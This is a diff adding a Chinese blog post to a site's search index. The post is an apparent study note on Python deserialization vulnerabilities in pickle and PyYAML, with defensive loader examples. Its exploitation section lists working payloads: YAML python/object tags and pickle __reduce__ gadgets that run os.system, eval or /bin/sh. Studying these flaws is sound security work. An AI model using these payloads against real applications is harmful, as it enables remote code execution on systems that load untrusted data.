@@ -915,4 +915,333 @@ yay -Syy
         <tag>Linux</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Python反序列化</title>
+    <url>/posts/f66dca92/</url>
+    <content><![CDATA[<h1 id="Python-反序列化漏洞"><a href="#Python-反序列化漏洞" class="headerlink" title="Python 反序列化漏洞"></a>Python 反序列化漏洞</h1><h2 id="什么是Python的序列化与反序列化"><a href="#什么是Python的序列化与反序列化" class="headerlink" title="什么是Python的序列化与反序列化"></a>什么是Python的序列化与反序列化</h2><h3 id="什么是Python的序列化"><a href="#什么是Python的序列化" class="headerlink" title="什么是Python的序列化"></a>什么是Python的序列化</h3><p>众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。</p>
+<p>由于Python中对象的形式多种多样，变化万千，在存储时按照原本的形式来存储过于庞大且麻烦，所以我们就需要把Python对象转换为可存储或可传输的标准化格式。将Python对象转换为可存储或传输的标准化格式（如字节流、字符串的过程，就叫做Python的序列化。  </p>
+<h3 id="什么是Python的反序列化"><a href="#什么是Python的反序列化" class="headerlink" title="什么是Python的反序列化"></a>什么是Python的反序列化</h3><p>既然为了存储和传输方便，将Python对象通过序列化的方式转换成了一种标准化的格式，那么在程序执行时，我们就需要把标准化格式还原为Python对象，而这个过程，就叫做Python的反序列化。  </p>
+<h3 id="序列化的本质"><a href="#序列化的本质" class="headerlink" title="序列化的本质"></a>序列化的本质</h3><ul>
+<li><p>序列化的本质是将对象的状态或数据结构转换为一种通用格式（如二进制，JSON，XML），使其可以保存到文件、数据库或通过网络传输。</p>
+</li>
+<li><p>反序列化是逆过程，将序列化后的数据还原为原始对象。</p>
+</li>
+</ul>
+<h3 id="Python中序列化的实现过程"><a href="#Python中序列化的实现过程" class="headerlink" title="Python中序列化的实现过程"></a>Python中序列化的实现过程</h3><p>Python庞大的库，为Python强大的功能实现提供支撑和保障。同样的，Python中序列化和反序列化的实现也是通过一些库和模块来实现的。  </p>
+<ol>
+<li>pickle模块<br>作为Python的原生模块，pickle支持几乎所有的Python对象<br>使用pickle进行序列化生成的是二进制格式数据</li>
+</ol>
+<p>代码示例：</p>
+<pre><code>import pickle
+
+data = &#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 30&#125;
+serialized_data = pickle.dumps(data)  # 序列化为字节流
+
+# 保存到文件
+with open(&quot;data.pkl&quot;, &quot;wb&quot;) as f:
+    pickle.dump(data, f)  
+</code></pre>
+<ol start="2">
+<li>json模块<br>json可以生成人类可读的JSON字符串<br>但json只支持基础类型（字典、列表、字符串、数字等），不支持Python特有对象（如类实例）的序列化。</li>
+</ol>
+<p>代码示例：</p>
+<pre><code>import json
+
+data = &#123;&quot;name&quot;: &quot;Bob&quot;, &quot;age&quot;: 25&#125;
+json_str = json.dumps(data)  # 序列化为JSON字符串
+
+# 保存到文件
+with open(&quot;data.json&quot;, &quot;w&quot;) as f:
+    json.dump(data, f)  
+</code></pre>
+<ol start="3">
+<li>PyYAML库<br>YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化格式，常用于配置文件和数据交换。Python 中通过 PyYAML 库支持 YAML。</li>
+</ol>
+<p>序列化实现：</p>
+<pre><code>import yaml
+
+data = &#123;
+    &quot;name&quot;: &quot;Alice&quot;,
+    &quot;age&quot;: 30,
+    &quot;skills&quot;: [&quot;Python&quot;, &quot;YAML&quot;],
+    &quot;address&quot;: &#123;&quot;city&quot;: &quot;Shanghai&quot;, &quot;zip&quot;: 200000&#125;
+&#125;
+
+# 序列化为YAML字符串
+yaml_str = yaml.dump(data, default_flow_style=False)
+print(yaml_str)  
+</code></pre>
+<p>输出：</p>
+<pre><code>address:
+city: Shanghai
+zip: 200000
+age: 30
+name: Alice
+skills:
+- Python
+- YAML  
+</code></pre>
+<p>保存&#x2F;读取文件：</p>
+<pre><code># 写入文件
+with open(&quot;data.yaml&quot;, &quot;w&quot;) as f:
+    yaml.dump(data, f)
+
+# 读取文件
+with open(&quot;data.yaml&quot;, &quot;r&quot;) as f:
+    loaded_from_file = yaml.safe_load(f)  
+</code></pre>
+<ol start="4">
+<li>使用 Protocol Buffers（protobuf）实现序列化<br>Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高性能通信和跨语言数据交换。需预先定义数据结构（.proto 文件）。</li>
+</ol>
+<h3 id="Python中反序列化实现过程"><a href="#Python中反序列化实现过程" class="headerlink" title="Python中反序列化实现过程"></a>Python中反序列化实现过程</h3><p>在以上Python序列化实现过程中，使用pickle模块和Pyyaml库，在实现反序列化的过程中存在安全风险。我们先来看看他们的反序列化过程是如何实现的  </p>
+<h4 id="YAML-反序列化实现"><a href="#YAML-反序列化实现" class="headerlink" title="YAML 反序列化实现"></a>YAML 反序列化实现</h4><p>YAML的反序列化过程通过PyYAML库实现，本质是将YAML文本解析为Python对象。默认的 <code>yaml.load()</code> 方法支持动态构造Python对象（包括类实例），但这也带来了安全风险。  </p>
+<h5 id="反序列化步骤："><a href="#反序列化步骤：" class="headerlink" title="反序列化步骤："></a>反序列化步骤：</h5><p>1.安装依赖</p>
+<pre><code>pip install pyyaml  
+</code></pre>
+<p>2.基础反序列化（安全模式）：</p>
+<pre><code>import yaml
+
+# YAML 文本（仅包含基础类型）
+yaml_text = &quot;&quot;&quot;
+name: Alice
+age: 30
+skills:
+- Python
+- YAML
+&quot;&quot;&quot;
+
+# 安全反序列化：仅解析基本类型（字典、列表等）
+data = yaml.safe_load(yaml_text)
+print(data[&quot;name&quot;])  # 输出 Alice  
+</code></pre>
+<p>3.动态对象反序列化（危险！）：  </p>
+<p>&emsp;&emsp;YAML 可以通过标签<code>（!!python/object）</code>动态构造 Python 对象，例如：</p>
+<pre><code># 恶意示例：反序列化时执行代码
+!!python/object/apply:os.system [&quot;echo &#39;Hacked!&#39;&quot;]  
+</code></pre>
+<p>&emsp;&emsp;危险的反序列化代码：  </p>
+<pre><code># 不要对不可信数据使用 yaml.load()！
+malicious_yaml = &quot;&quot;&quot;
+!!python/object/apply:os.system [&quot;echo &#39;Hacked!&#39;&quot;]
+&quot;&quot;&quot;
+yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader)  # 输出 Hacked!  
+</code></pre>
+<p>安全实践  </p>
+<p>&emsp;&emsp;始终使用 <code>yaml.safe_load()</code>：仅解析基础类型（字典、列表、字符串、数字），禁止动态对象构造。 </p>
+<p>&emsp;&emsp;禁用危险标签：若必须解析对象，需自定义加载器，过滤允许的类。  </p>
+<pre><code>from yaml import SafeLoader, Node, Constructor
+
+class RestrictedLoader(SafeLoader):
+    def construct_python_object(self, node: Node):
+        raise yaml.ConstructorError(&quot;禁止动态对象构造&quot;)
+
+# 注册自定义加载器
+RestrictedLoader.add_constructor(
+    &quot;tag:yaml.org,2002:python/object&quot;,
+    RestrictedLoader.construct_python_object
+)
+
+data = yaml.load(yaml_text, Loader=RestrictedLoader)  # 安全加载  
+</code></pre>
+<h4 id="Pickle-反序列化实现"><a href="#Pickle-反序列化实现" class="headerlink" title="Pickle 反序列化实现"></a>Pickle 反序列化实现</h4><p>Pickle 的反序列化通过 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 实现，其底层会重建对象的完整状态，包括调用<code>__reduce__</code>方法（若存在），从而可能执行任意代码。  </p>
+<h5 id="反序列化步骤：-1"><a href="#反序列化步骤：-1" class="headerlink" title="反序列化步骤："></a>反序列化步骤：</h5><p>1.序列化一个对象：  </p>
+<pre><code>import pickle
+
+class User:
+    def __init__(self, name):
+        self.name = name
+
+# 序列化对象
+user = User(&quot;Alice&quot;)
+serialized = pickle.dumps(user)  
+</code></pre>
+<p>2.基础反序列化:  </p>
+<pre><code># 反序列化
+loaded_user = pickle.loads(serialized)
+print(loaded_user.name)  # 输出 Alice  
+</code></pre>
+<p>3.恶意反序列化示例: </p>
+<pre><code>import pickle
+import os
+
+class Malicious:
+    def __reduce__(self):
+        # 反序列化时执行系统命令
+        return (os.system, (&quot;echo &#39;Hacked!&#39;&quot;,))
+
+# 生成恶意 payload
+payload = pickle.dumps(Malicious())
+
+# 反序列化触发攻击
+pickle.loads(payload)  # 输出 Hacked!  
+</code></pre>
+<p>安全风险根源:</p>
+<p>&emsp;&emsp;<code>__reduce__</code>方法：在反序列化时自动调用，返回一个元组（函数、参数），执行函数。</p>
+<p>&emsp;&emsp;任意代码执行：攻击者可构造恶意<code>__reduce__</code>方法，执行危险操作（如删除文件、反弹Shell）。  </p>
+<p>防御方法</p>
+<p>&emsp;&emsp;避免反序列化不可信数据：永远不要对来源未知的数据使用 <code>pickle.load()</code>。</p>
+<p>&emsp;&emsp;限制允许的类（白名单）：</p>
+<pre><code>import pickle
+
+class SafeUnpickler(pickle.Unpickler):
+    allowed_classes = &#123;&quot;__main__.User&quot;&#125;  # 仅允许User类
+
+    def find_class(self, module, name):
+        full_name = f&quot;&#123;module&#125;.&#123;name&#125;&quot;
+        if full_name not in self.allowed_classes:
+            raise pickle.UnpicklingError(f&quot;禁止的类: &#123;full_name&#125;&quot;)
+        return super().find_class(module, name)
+
+# 安全反序列化
+safe_data = SafeUnpickler(io.BytesIO(serialized)).load()  
+</code></pre>
+<h4 id="反序列化漏洞的成因"><a href="#反序列化漏洞的成因" class="headerlink" title="反序列化漏洞的成因"></a>反序列化漏洞的成因</h4><p>我们上面提到了YAML和pickle的反序列化过程以及他们的风险漏洞，这里来总结一下。 </p>
+<h5 id="YAML的反序列化漏洞"><a href="#YAML的反序列化漏洞" class="headerlink" title="YAML的反序列化漏洞"></a>YAML的反序列化漏洞</h5><p>造成YAML反序列化漏洞的原因是由于过于相信YAML数据来源，在反序列化的过程中使用了一些危险标签，使得攻击者利用这些标签使用 <code>yaml.load()</code> 方法来动态构造Python对象，导致程序错误地调用了 <code>os.system()</code> 进行命令执行  </p>
+<h5 id="Pickle-的反序列化漏洞"><a href="#Pickle-的反序列化漏洞" class="headerlink" title="Pickle 的反序列化漏洞"></a>Pickle 的反序列化漏洞</h5><p>造成pickle反序列化漏洞的原因是在反序列化过程中，存在调用<code>__reduce__</code>方法的可能，这一方法使得攻击者可以通过构造恶意类，在<code>__reduce__</code>中返回一个危险的可调用对象（如 os.system），从而在反序列化时触发任意代码执行。  </p>
+<h6 id="为什么-reduce-危险？"><a href="#为什么-reduce-危险？" class="headerlink" title="为什么__reduce__危险？"></a>为什么<code>__reduce__</code>危险？</h6><ul>
+<li>完全控制反序列化逻辑：</li>
+</ul>
+<p><code>__reduce__</code>允许攻击者指定任意函数和参数，且反序列化时自动执行。</p>
+<ul>
+<li>绕过对象状态限制：</li>
+</ul>
+<p>即使目标代码中没有恶意类，攻击者也可以构造包含危险函数的<code>__reduce__</code>。 </p>
+<h3 id="Python反序列化漏洞的利用"><a href="#Python反序列化漏洞的利用" class="headerlink" title="Python反序列化漏洞的利用"></a>Python反序列化漏洞的利用</h3><p>我们已经讨论过Python中的反序列化漏洞是由于错误使用<code>yaml.load()</code>、危险标签和<code>__reduce__</code>，导致的命令执行漏洞，因此，我们的利用点也着眼于此。  </p>
+<h4 id="yaml漏洞的利用"><a href="#yaml漏洞的利用" class="headerlink" title="yaml漏洞的利用"></a>yaml漏洞的利用</h4><p>对于PyYaml&lt;5.1版本下的漏洞，其主要原因主要出现在下面五个python标签：</p>
+<pre><code>python/name
+python/module
+python/object
+python/object/new
+python/object/apply
+</code></pre>
+<p>漏洞成因：</p>
+<p>&emsp;由于上面提到得五个标签，在constructor.py文件被加载器解析导致，攻击者利用这类标签可以达到任意命令执行，以及验证绕过等漏洞得利用。</p>
+<p>payload：</p>
+<pre><code>!!python/object/apply:os.system [&quot;calc.exe&quot;]
+!!python/object/new:os.system [&quot;calc.exe&quot;]    
+!!python/object/new:subprocess.check_output [[&quot;calc.exe&quot;]]
+!!python/object/apply:subprocess.check_output [[&quot;calc.exe&quot;]]  
+</code></pre>
+<p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader </p>
+<p>针对不同的需要，选择不同的加载器，有以下几种加载器</p>
+<pre><code>BaseConstructor：仅加载最基本的YAML
+
+SafeConstructor：安全加载Yaml语言的子集，建议用于加载不受信任的输入（safe_load)
+
+FullConstructor：加载的模块必须位于 sys.modules 中（说明程序已经 import 过了才让加载）。这个是默认的加载器。
+
+UnsafeConstructor（也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load）
+
+Constructor：等同于UnsafeConstructor
+</code></pre>
+<p>如果说指定的加载器是UnsafeConstructor 或者Constructor，那么利用方式就照旧  </p>
+<p>payload</p>
+<p>我们可以用python的内置函数eval（或者exec）来执行代码，用map来触发函数执行，用tuple将map对象转化为元组输出来（当然用list、frozenset、bytes都可以），用python写出来如下</p>
+<pre><code>tuple(map(eval, [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;]))
+</code></pre>
+<p>变为yaml</p>
+<pre><code>yaml.load(&quot;&quot;&quot;
+!!python/object/new:tuple
+- !!python/object/new:map
+- !!python/name:eval
+- [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;]
+&quot;&quot;&quot;)
+</code></pre>
+<p>除此之外网上还有很多大佬有其他的payload</p>
+<pre><code>#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
+!!python/object/new:type
+args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]
+listitems: &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;
+</code></pre>
+<p>&nbsp;</p>
+<pre><code>#报错但是执行了
+  - !!python/object/new:str
+    args: []
+    state: !!python/tuple
+    - &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;
+    - !!python/object/new:staticmethod
+    args: [0]
+    state:
+        update: !!python/name:exec
+</code></pre>
+<p>&nbsp;</p>
+<pre><code>- !!python/object/new:yaml.MappingNode
+listitems: !!str &#39;!!python/object/apply:subprocess.Popen [whoami]&#39;
+state:
+    tag: !!str dummy
+    value: !!str dummy
+    extend: !!python/name:yaml.unsafe_load
+</code></pre>
+<p>参考：</p>
+<blockquote>
+<p><a href="https://forum.butian.net/share/2288">PyYaml反序列化漏洞</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.cnblogs.com/damoxilai/p/16707055.html">PyYAML反序列化漏洞</a>  </p>
+</blockquote>
+<h4 id="Pickle-漏洞利用"><a href="#Pickle-漏洞利用" class="headerlink" title="Pickle 漏洞利用"></a>Pickle 漏洞利用</h4><p>漏洞常见出现地方</p>
+<ol>
+<li><p>通常在解析认证<code>token</code>, <code>session</code>的时候. 现在很多 Web 服务都使用<code>redis</code>、<code>mongodb</code>、<code>memcached</code>等来存储<code>session</code>等状态信息.</p>
+</li>
+<li><p>可能将对象 Pickle 后存储成磁盘文件.</p>
+</li>
+<li><p>可能将对象 Pickle 后在网络中传输.</p>
+</li>
+</ol>
+<p>基本 Payload</p>
+<pre><code>import os
+import pickle
+
+class Demo(object):
+    def __reduce__(self):
+        shell = &#39;/bin/sh&#39;
+        return (os.system,(shell,))
+
+demo = Demo()
+pickle.loads(pickle.dumps(demo))  
+</code></pre>
+<h5 id="Marshal-反序列化"><a href="#Marshal-反序列化" class="headerlink" title="Marshal 反序列化"></a>Marshal 反序列化</h5><p>由于pickle无法序列化code对象, 因此在python2.6后增加了一个marshal模块来处理code对象的序列化问题.  </p>
+<pre><code>import base64
+import marshal
+
+def demo():
+    import os
+    os.system(&#39;/bin/sh&#39;)
+
+code_serialized = base64.b64encode(marshal.dumps(demo()))
+print(code_serialized)  
+</code></pre>
+<p>但是marshal不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.  </p>
+<p>Pyload(PyYaml &gt;&#x3D; 5.1)</p>
+<pre><code>from yaml import *
+data = b&quot;&quot;&quot;!!python/object/apply:subprocess.Popen
+- calc&quot;&quot;&quot;
+deserialized_data = load(data, Loader=Loader)
+print(deserialized_data)
+</code></pre>
+<p>&nbsp;</p>
+<pre><code>from yaml import *
+data = b&quot;&quot;&quot;!!python/object/apply:subprocess.Popen
+- calc&quot;&quot;&quot;
+deserialized_data = unsafe_load(data) 
+print(deserialized_data)  
+</code></pre>
+<p>参考：  </p>
+<blockquote>
+<p><a href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#">Python反序列化漏洞与沙箱逃逸</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://goodapple.top/archives/1069">Pickle反序列化</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/H3rmesk1t/Security-Learning/blob/main/PythonSec/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Python%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md">Python安全学习—Python反序列化漏洞</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://tttang.com/archive/1885/">python反序列化详解</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
 </search>
